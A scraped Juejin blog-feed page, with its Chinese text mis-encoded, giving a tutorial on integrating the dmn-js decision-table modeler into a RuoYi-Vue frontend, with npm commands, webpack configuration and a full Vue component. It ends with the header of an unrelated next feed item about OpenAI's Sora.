itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ruoyié›†æˆdmnè§„åˆ™å¼•æ“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1535333867720295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç æ¬¡ä½é¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:22:59.000Z" title="Mon Dec 15 2025 10:22:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¯å¢ƒè¯´æ˜</h2>
<p>åŸºäºRuoYi-Vue2qå‰ç«¯å¦‚ä½•é›†æˆDMNç»„ä»¶<br/>
ç‰ˆæœ¬å·:3.9.0<br/>
æ›´å¤šå…³äºruoyié›†æˆå·¥ä½œæµï¼Œè¯·è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruoyiflow.com%2Fproduct%2F3" target="_blank" title="https://www.ruoyiflow.com/product/3" ref="nofollow noopener noreferrer">è‹¥ä¾å·¥ä½œæµ</a></p>
<h2 data-id="heading-1">é›†æˆæ­¥éª¤</h2>
<ul>
<li>å®‰è£…ä¾èµ–</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">npm install dmn-js dmn-js-properties-panel --save
npm install --save dmn-moddle
</code></pre>
<ul>
<li>vue.config.jså¢åŠ dmn.jsé…ç½®, åœ¨transpileDependenciesï¼Œalias è¿›è¡Œè®¾ç½®</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">lias: {
    '@': resolve('src'),
    'lezer-feel$': resolve('node_modules/lezer-feel/dist/index.js'),
    '@camunda/feel-builtins$': resolve('node_modules/@camunda/feel-builtins/dist/index.js'),
    'feelers$': resolve('node_modules/feelers/dist/index.js'),
    'feelin$': resolve('node_modules/feelin/dist/index.cjs'),
    '@bpmn-io/feel-lint$': resolve('node_modules/@bpmn-io/feel-lint/dist/index.js'),
    '@bpmn-io/lezer-feel$': resolve('node_modules/@bpmn-io/lezer-feel/dist/index.js'),
    // dmn-moddle ä½¿ç”¨ ES æ¨¡å—ï¼Œwebpack4 éœ€è¦æŒ‡å‘ CJS ç‰ˆæœ¬
    'dmn-moddle$': resolve('node_modules/dmn-moddle/dist/index.cjs')
    }

  transpileDependencies: [
    'quill', 
    'bpmn-js', 
    'diagram-js',
    'bpmn-js-properties-panel',
    '@bpmn-io/properties-panel',
    '@bpmn-io/feel-editor',
    '@bpmn-io/feel-lint', 
    '@bpmn-io/lezer-feel', 
    'feelers', 
    //ä»¥ä¸‹æ˜¯dmn-jséœ€è¦çš„é…ç½®ï¼Œä¸»è¦æ˜¯å› ä¸ºdmn-js ä½¿ç”¨äº† ES6+ è¯­æ³•ï¼Œä½† webpack æœªè½¬è¯‘ node_modules ä¸­çš„è¿™äº›æ–‡ä»¶
    'lezer-feel',
    'dmn-js',
    'dmn-js-properties-panel',
    'dmn-js-boxed-expression',
    'dmn-js-decision-table',
    'dmn-js-literal-expression',
    'dmn-js-shared',
    'dmn-moddle'],
</code></pre>
<ul>
<li>å‰ç«¯é¡µé¢ç¼–ç </li>
</ul>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-container class="dmn-modeler-container"&gt;
    &lt;!-- å¤´éƒ¨æ“ä½œåŒºåŸŸ --&gt;
    &lt;el-header class="dmn-header"&gt;
      &lt;div class="header-content"&gt;
        &lt;div class="header-title"&gt;
          &lt;h3&gt;DMN å†³ç­–è¡¨å»ºæ¨¡å™¨&lt;/h3&gt;
        &lt;/div&gt;
        &lt;div class="header-actions"&gt;
          &lt;el-button-group&gt;
            &lt;el-button icon="el-icon-folder-opened" @click="openFile"&gt;å¯¼å…¥&lt;/el-button&gt;
            &lt;el-button icon="el-icon-download" @click="downloadDiagram"&gt;å¯¼å‡º&lt;/el-button&gt;
            &lt;el-button icon="el-icon-document" type="primary" @click="saveDiagram"&gt;éƒ¨ç½²&lt;/el-button&gt;
          &lt;/el-button-group&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/el-header&gt;
    
    &lt;!-- ä¸»è¦å†…å®¹åŒºåŸŸ --&gt;
    &lt;el-main class="dmn-main"&gt;
      &lt;div class="dmn-content"&gt;
        &lt;!-- DMN ç”»å¸ƒåŒºåŸŸ --&gt;
        &lt;div class="canvas-container"&gt;
          &lt;div id="canvas" class="dmn-canvas" v-loading="initializing"&gt;&lt;/div&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/el-main&gt;
    
    &lt;!-- æ–‡ä»¶è¾“å…¥ --&gt;
    &lt;input 
      ref="fileInput" 
      type="file" 
      accept=".dmn,.xml" 
      style="display: none" 
      @change="handleFileImport"
    /&gt;
  &lt;/el-container&gt;
&lt;/template&gt;

&lt;script&gt;
import DmnModeler from 'dmn-js/lib/Modeler'
import FileSaver from 'file-saver'
import { deployDmnTable } from '@/api/camunda/dmn'

// æ ·å¼å¼•å…¥
// åŸºç¡€æ ·å¼
import 'dmn-js/dist/assets/diagram-js.css'
// DMN å­—ä½“æ ·å¼
import 'dmn-js/dist/assets/dmn-font/css/dmn.css'
// å†³ç­–è¡¨ç›¸å…³æ ·å¼ï¼ˆç¡®ä¿å†³ç­–è¡¨æ­£ç¡®æ˜¾ç¤ºï¼‰
import 'dmn-js/dist/assets/dmn-js-shared.css'
import 'dmn-js/dist/assets/dmn-js-decision-table.css'
import 'dmn-js/dist/assets/dmn-js-decision-table-controls.css'
// DRD (Decision Requirements Diagram) è§†å›¾æ ·å¼
import 'dmn-js/dist/assets/dmn-js-drd.css'

export default {
  name: 'CamundaDmnModeler',
  data() {
    return {
      dmnModeler: null,
      canUndo: false,
      canRedo: false,
      isInitialized: false, // æ ‡è®°æ˜¯å¦åˆå§‹åŒ–æˆåŠŸ
      initializing: false, // åˆå§‹åŒ–æˆ–å¯¼å…¥ä¸­çš„ loading çŠ¶æ€
      initPromise: null // è®°å½•åˆå§‹åŒ– Promiseï¼Œä¾¿äºåç»­ç­‰å¾…
    }
  },
  mounted() {
    this.$nextTick(() =&gt; {
      this.initModeler()
    })
  },
  beforeDestroy() {
    if (this.dmnModeler) {
      this.dmnModeler.destroy()
      this.dmnModeler = null
    }
    this.initPromise = null
  },
  methods: {
    // ç”Ÿæˆéšæœºå†³ç­–è¡¨ID
    generateDecisionId() {
      const randomNum = Math.floor(Math.random() * 10000)
      return `Decision_${randomNum}`
    },

    initModeler() {
      if (this.initializing &amp;&amp; this.initPromise) {
        return this.initPromise
      }

      try {
        // å¦‚æœå·²æœ‰å®ä¾‹ï¼Œå…ˆé”€æ¯é‡æ–°åˆ›å»ºï¼Œé¿å…æ®‹ç•™çŠ¶æ€
        if (this.dmnModeler) {
          try {
            this.dmnModeler.destroy()
          } catch (destroyErr) {
            console.warn('é”€æ¯æ—§çš„ DMN Modeler å¤±è´¥:', destroyErr)
          }
        }

        this.dmnModeler = new DmnModeler({
          container: '#canvas'
        })
        this.initializing = true
        this.isInitialized = false
        
        // åŠ è½½ç©ºç™½å†³ç­–è¡¨ - ä½¿ç”¨æ ‡å‡†çš„ DMN 1.3 æ ¼å¼
        // æ ¹æ® dmn-moddle 11.0.0ï¼Œä½¿ç”¨æ­£ç¡®çš„å‘½åç©ºé—´
        const decisionId = this.generateDecisionId()
        const decisionTableId = 'DecisionTable_' + Date.now()
        const diagramXML = `&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;definitions xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/" xmlns:dmndi="http://www.omg.org/spec/DMN/20180521/DMNDI" xmlns:di="http://www.omg.org/spec/DMN/20180521/DI/" xmlns:dc="http://www.omg.org/spec/DMN/20180521/DC/" id="Definitions_1" name="å†³ç­–è¡¨" namespace="http://camunda.org/schema/1.0/dmn"&gt;
  &lt;decision id="${decisionId}" name="å†³ç­–è¡¨"&gt;
    &lt;decisionTable id="${decisionTableId}" hitPolicy="UNIQUE"&gt;
      &lt;input id="Input_1" label="è¾“å…¥"&gt;
        &lt;inputExpression id="InputExpression_1" typeRef="string"&gt;
          &lt;text&gt;&lt;/text&gt;
        &lt;/inputExpression&gt;
      &lt;/input&gt;
      &lt;output id="Output_1" label="è¾“å‡º" typeRef="string" /&gt;
    &lt;/decisionTable&gt;
  &lt;/decision&gt;
  &lt;dmndi:DMNDI&gt;
    &lt;dmndi:DMNDiagram id="DMNDiagram_1"&gt;
      &lt;dmndi:DMNShape id="DMNShape_${decisionId}" dmnElementRef="${decisionId}"&gt;
        &lt;dc:Bounds x="100" y="100" width="300" height="200" /&gt;
      &lt;/dmndi:DMNShape&gt;
    &lt;/dmndi:DMNDiagram&gt;
  &lt;/dmndi:DMNDI&gt;
&lt;/definitions&gt;`

        // ä½¿ç”¨ç®­å¤´å‡½æ•°ç¡®ä¿ this ä¸Šä¸‹æ–‡æ­£ç¡®
        const initTask = this.dmnModeler.importXML(diagramXML)
        this.initPromise = initTask
        initTask.then(() =&gt; {
          // åªæœ‰åœ¨ importXML æˆåŠŸåæ‰æ ‡è®°ä¸ºå·²åˆå§‹åŒ–
          this.isInitialized = true
          this.initializing = false
          this.$message.success('å†³ç­–è¡¨åˆå§‹åŒ–æˆåŠŸ')
          
          // ç¡®ä¿ dmnModeler å·²å®Œå…¨åˆå§‹åŒ–åå†è®¿é—®æœåŠ¡
          if (this.dmnModeler &amp;&amp; typeof this.dmnModeler.get === 'function') {
            // ç­‰å¾… DOM æ›´æ–°
            this.$nextTick(() =&gt; {
              // ç›‘å¬æ’¤é”€é‡åšçŠ¶æ€
              const eventBus = this.dmnModeler.get('eventBus')
              if (eventBus) {
                eventBus.on('commandStack.changed', () =&gt; {
                  if (this.dmnModeler &amp;&amp; typeof this.dmnModeler.get === 'function') {
                    const commandStack = this.dmnModeler.get('commandStack')
                    if (commandStack) {
                      this.canUndo = commandStack.canUndo()
                      this.canRedo = commandStack.canRedo()
                    }
                  }
                })
              }
              
            })
          }
        }).catch(err =&gt; {
          console.error('åˆå§‹åŒ–å¤±è´¥:', err)
          console.error('XML å†…å®¹:', diagramXML)
          this.isInitialized = false
          this.initializing = false
          this.$message.error('å†³ç­–è¡¨åˆå§‹åŒ–å¤±è´¥: ' + (err.message || 'æœªçŸ¥é”™è¯¯'))
          // å¦‚æœåˆå§‹åŒ–å¤±è´¥ï¼Œæ¸…ç©º dmnModelerï¼Œé¿å…ä½¿ç”¨ä¸å®Œæ•´çš„çŠ¶æ€
          if (this.dmnModeler) {
            try {
              this.dmnModeler.destroy()
            } catch (e) {
              console.warn('é”€æ¯å¤±è´¥çš„ modeler:', e)
            }
            this.dmnModeler = null
          }
          throw err
        }).finally(() =&gt; {
          // ä¿æŒ initPromise åªä»£è¡¨æœ€è¿‘ä¸€æ¬¡åˆå§‹åŒ–
          if (this.initPromise === initTask) {
            this.initPromise = null
          }
        })

        return initTask
      } catch (err) {
        console.error('åˆ›å»º DMN Modeler å¤±è´¥:', err)
        this.$message.error('åˆ›å»ºå†³ç­–è¡¨å»ºæ¨¡å™¨å¤±è´¥: ' + (err.message || 'æœªçŸ¥é”™è¯¯'))
        this.initializing = false
        this.isInitialized = false
        this.initPromise = null
        throw err
      }
    },

    async ensureModelerReady() {
      debugger
      if (this.isInitialized &amp;&amp; this.dmnModeler &amp;&amp; typeof this.dmnModeler.get === 'function') {
        return true
      }
      if (!this.initializing || !this.initPromise) {
        try {
          await this.initModeler()
        } catch (err) {
          console.error('é‡æ–°åˆå§‹åŒ–å†³ç­–è¡¨å»ºæ¨¡å™¨å¤±è´¥:', err)
          return false
        }
      }
      if (this.initPromise) {
        try {
          await this.initPromise
        } catch (err) {
          console.error('ç­‰å¾…å†³ç­–è¡¨å»ºæ¨¡å™¨åˆå§‹åŒ–å¤±è´¥:', err)
          return false
        }
      }
      return this.isInitialized &amp;&amp; this.dmnModeler &amp;&amp; typeof this.dmnModeler.get === 'function'
    },

    // ç¡®ä¿XMLåŒ…å«å¿…è¦çš„å‘½åç©ºé—´
    ensureDmnNamespace(xml) {
      // æ£€æŸ¥æ˜¯å¦åŒ…å«æ­£ç¡®çš„ DMN 1.3 å‘½åç©ºé—´
      // MODEL å‘½åç©ºé—´åº”è¯¥æ˜¯ https://www.omg.org/spec/DMN/20191111/MODEL/
      if (xml.indexOf('xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/"') === -1 &amp;&amp; 
          xml.indexOf('xmlns:dmn="https://www.omg.org/spec/DMN/20191111/MODEL/"') === -1) {
        // å¦‚æœç¼ºå°‘é»˜è®¤å‘½åç©ºé—´ï¼Œå°è¯•æ·»åŠ 
        if (xml.indexOf('&lt;definitions') !== -1) {
          // æ›¿æ¢ definitions æ ‡ç­¾ï¼Œæ·»åŠ é»˜è®¤å‘½åç©ºé—´
          xml = xml.replace(
            /&lt;definitions([^&gt;]*)&gt;/,
            '&lt;definitions$1 xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/" xmlns:dmndi="http://www.omg.org/spec/DMN/20180521/DMNDI" xmlns:di="http://www.omg.org/spec/DMN/20180521/DI/" xmlns:dc="http://www.omg.org/spec/DMN/20180521/DC/"&gt;'
          )
        } else if (xml.indexOf('&lt;dmn:definitions') !== -1) {
          // å¦‚æœä½¿ç”¨ dmn: å‰ç¼€ï¼Œä¹Ÿæ·»åŠ å‘½åç©ºé—´
          xml = xml.replace(
            /&lt;dmn:definitions([^&gt;]*)&gt;/,
            '&lt;dmn:definitions$1 xmlns:dmn="https://www.omg.org/spec/DMN/20191111/MODEL/" xmlns:dmndi="http://www.omg.org/spec/DMN/20180521/DMNDI" xmlns:di="http://www.omg.org/spec/DMN/20180521/DI/" xmlns:dc="http://www.omg.org/spec/DMN/20180521/DC/"&gt;'
          )
        }
      }
      return xml
    },

    // ä» XML ä¸­æå–ç¬¬ä¸€ä¸ª decision çš„ name å±æ€§
    extractDecisionName(xml) {
      if (!xml || typeof xml !== 'string') {
        return null
      }
      try {
        if (typeof window !== 'undefined' &amp;&amp; window.DOMParser) {
          const parser = new DOMParser()
          const doc = parser.parseFromString(xml, 'text/xml')
          const parserError = doc.getElementsByTagName('parsererror')
          if (parserError &amp;&amp; parserError.length) {
            console.warn('DOMParser è§£æ DMN XML å‡ºé”™ï¼Œé€€å›æ­£åˆ™è§£æ')
          } else {
            // å…ˆå°è¯•ä¸å¸¦å‘½åç©ºé—´çš„ decision
            let decisionEl = doc.getElementsByTagName('decision')[0]
            if (!decisionEl) {
              // å†å°è¯•å¸¦å‘½åç©ºé—´çš„ decision
              decisionEl = doc.getElementsByTagNameNS('https://www.omg.org/spec/DMN/20191111/MODEL/', 'decision')[0]
            }
            if (decisionEl) {
              const name = decisionEl.getAttribute('name')
              if (name) {
                return name
              }
            }
          }
        }
      } catch (err) {
        console.warn('DOMParser æå–å†³ç­–åç§°å¤±è´¥:', err)
      }

      // æ­£åˆ™åå¤‡æ–¹æ¡ˆï¼Œå…¼å®¹å•å¼•å·æˆ–åŒå¼•å·
      const match = xml.match(/&lt;\s*(?:dmn:)?decision\b[^&gt;]*\bname=['"]([^'"]+)['"]/i)
      if (match &amp;&amp; match[1]) {
        return match[1]
      }
      return null
    },

    async saveDiagram() {
      try {
        // const ready = await this.ensureModelerReady()
        // if (!ready) {
        //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨æœªåˆå§‹åŒ–ï¼Œè¯·ç¨åå†è¯•')
        //   return
        // }
        
        const modeler = this.dmnModeler
        // if (!modeler || typeof modeler.get !== 'function') {
        //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨ä¸å¯ç”¨ï¼Œè¯·åˆ·æ–°é¡µé¢åé‡è¯•')
        //   return
        // }

        const { xml } = await modeler.saveXML({ 
          format: true,
          preamble: true
        })
        
        // ç¡®ä¿XMLåŒ…å«å¿…è¦çš„å‘½åç©ºé—´
        const processedXml = this.ensureDmnNamespace(xml)
        
        // è·å–å†³ç­–è¡¨åç§°ï¼šä¼˜å…ˆè¯»å– XML ä¸­ decision çš„ name
        let decisionName = this.extractDecisionName(processedXml)
        
        if (!decisionName) {
          try {
            const elementRegistry = modeler.get('elementRegistry')
            if (elementRegistry) {
              // å°è¯•ä»å†³ç­–è¡¨ä¸­è·å–åç§°
              const decisions = elementRegistry.filter(el =&gt; el.type === 'dmn:Decision')
              if (decisions.length &gt; 0) {
                const decision = decisions[0]
                const bo = decision.businessObject || decision
                decisionName = bo.name || bo.id || decisionName
              }
            }
          } catch (e) {
            console.warn('ä» elementRegistry è·å–å†³ç­–è¡¨åç§°å¤±è´¥:', e)
          }
        }

        if (!decisionName) {
          decisionName = 'decision_' + Date.now()
        }
        
        // å‡†å¤‡éƒ¨ç½²å‚æ•°
        const deployData = {
          decisionName: decisionName,
          dmnXml: processedXml,
          tenantId: '',
          description: 'å†³ç­–è¡¨éƒ¨ç½²'
        }
        
        // è°ƒç”¨éƒ¨ç½²API
        this.$message.info('æ­£åœ¨éƒ¨ç½²å†³ç­–è¡¨...')
        const response = await deployDmnTable(deployData)
        
        this.$message.success(`å†³ç­–è¡¨éƒ¨ç½²æˆåŠŸï¼å†³ç­–åç§°: ${decisionName}`)
        
        console.log('Deployment response:', response)
        // è·³è½¬åˆ°å†³ç­–è¡¨åˆ—è¡¨é¡µé¢
        this.$router.push('/dmn/list')
        
      } catch (err) {
        console.error('Deployment error:', err)
        const errorMessage = err.response?.data?.message || err.message || 'éƒ¨ç½²å¤±è´¥'
        this.$message.error('éƒ¨ç½²å¤±è´¥: ' + errorMessage)
      }
    },

    async downloadDiagram() {
      try {
        // const ready = await this.ensureModelerReady()
        // if (!ready) {
        //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨æœªåˆå§‹åŒ–ï¼Œè¯·ç¨åå†è¯•')
        //   return
        // }
        
        const modeler = this.dmnModeler
        // if (!modeler || typeof modeler.get !== 'function') {
        //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨ä¸å¯ç”¨ï¼Œè¯·åˆ·æ–°é¡µé¢åé‡è¯•')
        //   return
        // }

        const { xml } = await modeler.saveXML({ 
          format: true,
          preamble: true
        })
        // ç¡®ä¿XMLåŒ…å«å¿…è¦çš„å‘½åç©ºé—´
        const processedXml = this.ensureDmnNamespace(xml)
        const blob = new Blob([processedXml], { type: 'application/xml' })
        FileSaver.saveAs(blob, 'decision-table.dmn')
      } catch (err) {
        this.$message.error('å¯¼å‡ºå¤±è´¥: ' + (err.message || 'æœªçŸ¥é”™è¯¯'))
      }
    },

    openFile() {
      this.$refs.fileInput.click()
    },
    
    async handleFileImport(event) {
      const file = event.target.files[0]
      if (!file) return
      
      // const ready = await this.ensureModelerReady()
      // if (!ready) {
      //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨åˆå§‹åŒ–å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢åé‡è¯•')
      //   return
      // }
      
      const reader = new FileReader()
      reader.onload = (e) =&gt; {
        try {
          const xml = e.target.result
          this.initializing = true
          const modeler = this.dmnModeler
          // if (!modeler || typeof modeler.get !== 'function') {
          //   this.initializing = false
          //   this.$message.error('å†³ç­–è¡¨å»ºæ¨¡å™¨ä¸å¯ç”¨ï¼Œè¯·åˆ·æ–°é¡µé¢åé‡è¯•')
          //   return
          // }
          modeler.importXML(xml).then(() =&gt; {
            this.isInitialized = true
            this.initializing = false
            this.$message.success('æ–‡ä»¶å¯¼å…¥æˆåŠŸ')
          }).catch(error =&gt; {
            console.error('æ–‡ä»¶å¯¼å…¥å¤±è´¥:', error)
            this.isInitialized = false
            this.initializing = false
            this.$message.error('æ–‡ä»¶å¯¼å…¥å¤±è´¥: ' + (error.message || 'æœªçŸ¥é”™è¯¯'))
          })
        } catch (error) {
          console.error('æ–‡ä»¶è¯»å–å¤±è´¥:', error)
          this.initializing = false
          this.$message.error('æ–‡ä»¶è¯»å–å¤±è´¥: ' + (error.message || 'æœªçŸ¥é”™è¯¯'))
        }
      }
      reader.readAsText(file)
      
      // æ¸…ç©ºæ–‡ä»¶è¾“å…¥
      event.target.value = ''
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.dmn-modeler-container {
  width: 100%;
  height: 100vh;
  min-width: 900px;
  display: flex;
  flex-direction: column;
}

/* å¤´éƒ¨æ ·å¼ */
.dmn-header {
  background-color: #f5f7fa;
  border-bottom: 1px solid #e4e7ed;
  padding: 0 20px;
  height: 60px !important;
  display: flex;
  align-items: center;
}

.header-content {
  width: 100%;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.header-title h3 {
  margin: 0;
  color: #303133;
  font-size: 18px;
  font-weight: 500;
}

.header-actions {
  display: flex;
  gap: 15px;
  flex-wrap: wrap;
}

.header-actions .el-button-group {
  margin-right: 0;
}

.header-actions .el-button-group .el-button {
  margin-right: 0;
}

/* ä¸»å†…å®¹åŒºåŸŸæ ·å¼ */
.dmn-main {
  padding: 0;
  height: calc(100vh - 60px);
  overflow: hidden;
}

.dmn-content {
  display: flex;
  height: 100%;
  width: 100%;
}

/* ç”»å¸ƒå®¹å™¨æ ·å¼ */
.canvas-container {
  flex: 1;
  position: relative;
  display: flex;
  flex-direction: column;
  min-width: 0; /* å…è®¸ flex å­å…ƒç´ ç¼©å° */
}

.dmn-canvas {
  width: 100%;
  height: 100%;
  border: 1px solid #dcdfe6;
  background-color: #fff;
}

&lt;/style&gt;

</code></pre>
<h2 data-id="heading-2">æœ€ç»ˆé¡µé¢å±•ç¤º</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a96e614955d4819805d2fc81d5ca3c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5qyh5L2N6Z2i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398979&amp;x-signature=Mz%2BtwnNwYlHxCrRajjgE55UwMz0%3D" alt="dmn1.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»… 4 äºº 28 å¤©ï¼OpenAI é¦–æ› Sora å†…å¹•ï¼š85% ä»£ç ç«Ÿç”± AI å®Œæˆ]]></title>    <link>https://juejin.cn/post/7583707681003667502</link>    <guid>https://juejin.cn/post/7583707681003667502</guid>    <pubDate>2025-12-15T10:21:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583707681003667502" data-draft-id="7583913535270633482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»… 4 äºº 28 å¤©ï¼OpenAI é¦–æ› Sora å†…å¹•ï¼š85% ä»£ç ç«Ÿç”± AI å®Œæˆ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2025-12-15T10:21:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»… 4 äºº 28 å¤©ï¼OpenAI é¦–æ› Sora å†…å¹•ï¼š85% ä»£ç ç«Ÿç”± AI å®Œæˆ
